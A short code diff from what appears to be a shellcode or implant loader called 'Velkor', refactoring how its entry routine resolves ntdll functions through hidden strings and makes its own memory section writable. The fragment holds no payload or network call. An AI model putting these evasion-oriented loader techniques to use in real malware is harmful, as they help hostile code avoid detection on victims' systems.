@@ -41,8 +41,8 @@ EXTERN_C D_SEC( B ) VOID Entry(
     // resolve ntdll!RtlAllocateHeap and ntdll!NtProtectVirtualMemory for
     // updating/patching the Instance in the current memory
     //
-    if ( ( InstVelkor.Module[eNtdll] = LdrLoadModule( XprNtdll ) ) ) {
-        if ( !( InstVelkor.FunctionPtr.NtProtectVirtualMemory = ( decltype(&NtProtectVirtualMemory) )LdrLoadFunc( InstVelkor.Module[eNtdll], XPR( "NtProtectVirtualMemory" ) ) )
+    if ( ( InstVelkor.VkWin32.Module[eNtdll] = LdrLoadModule( XprNtdll ) ) ) {
+        if ( !( InstVelkor.VkWin32.FunctionPtr.NtProtectVirtualMemory = ( decltype( &NtProtectVirtualMemory ) )LdrLoadFunc( InstVelkor.VkWin32.Module[eNtdll], XPR( "NtProtectVirtualMemory" ) ) )
         ) {
             return;
         }
@@ -52,11 +52,13 @@ EXTERN_C D_SEC( B ) VOID Entry(
     // change the protection of the .global section page to RW
     // to be able to write the allocated instance heap address
     //
-    if ( ! NT_SUCCESS( InstVelkor.FunctionPtr.NtProtectVirtualMemory(
+    if ( ! NT_SUCCESS( InstVelkor.VkWin32.FunctionPtr.NtProtectVirtualMemory(
         NtCurrentProcess(), &MmAddr, &MmSize, PAGE_READWRITE, &Protect
     ) ) ) {
         return;
     }
+
+    VkMem::Heap::Alloc( 0x10 );
 
     //
     // assign heap address into the RW memory page
